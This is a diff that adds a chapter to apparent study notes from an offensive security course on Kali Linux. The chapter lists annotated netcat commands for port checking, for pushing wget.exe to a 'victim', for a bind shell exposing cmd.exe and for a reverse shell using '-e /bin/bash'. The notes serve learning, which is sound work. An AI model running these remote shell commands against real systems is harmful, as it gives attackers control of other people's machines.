@@ -1,6 +1,8 @@
 #***************************************************************************
 #**************** OFFENSIVE SECURITY WITH KALI LINUX ***********************
 #***************************************************************************
+#*************************** CHAPTER 1 *************************************
+#***************************************************************************
 
 # KALI MENU
 updatedb							# builds a FileSystem's database
@@ -43,5 +45,57 @@ wc access.log						# returns line count
 cat access.log | cut -d " " -f 1 |			# delimiters = " " then take first field
 	sort | uniq -c |						# sort and count the occurencies of every IP request
   	sort -urn								# sort in unique (-u), reverse-order (-r), numeric-sort(-n)
+
+
+#***************************************************************************
+#*************************** CHAPTER 2 *************************************
+#***************************************************************************
+
+# ESSENTIAL TOOLS
+
+nc -nv 10.0.0.22 110			# Netcat checks TCP port 110 is open on target (-nv : numeric IP no dns, verbose)
+
+# FILE TRANS. server(vtm)
+nc -nvlp 4444 > incoming.exe	# Receives exe file from any, on tcp port 4444 and rename it "incoming.exe
+# FILE TRANS. client(atk)
+locate wget.exe			
+nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe
+								# Sends wget.exe to victim
+
+# BIND server(vtm):
+nc -nlvp 4444 cmd.exe			# Bound TCP port 4444 to cmd.exe, so any IO from cmd.exe will be 
+								# redirected to the network. This means client can use server's cmd.exe remotely
+# BIND client(atk):
+nc -nv 10.0.0.22 4444			# Client connects to server and is able to use cmd as server service provided					
+
+
+# REVERSE SHELL server(atk)
+nc -nvlp 4444					# Wait for victim connection
+# REVERSE SHELL client(vtm)
+nc -nv 10.0.0.22 4444 -e /bin/bash		# victim provides to attacker his shell (cmd.exe from windows)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
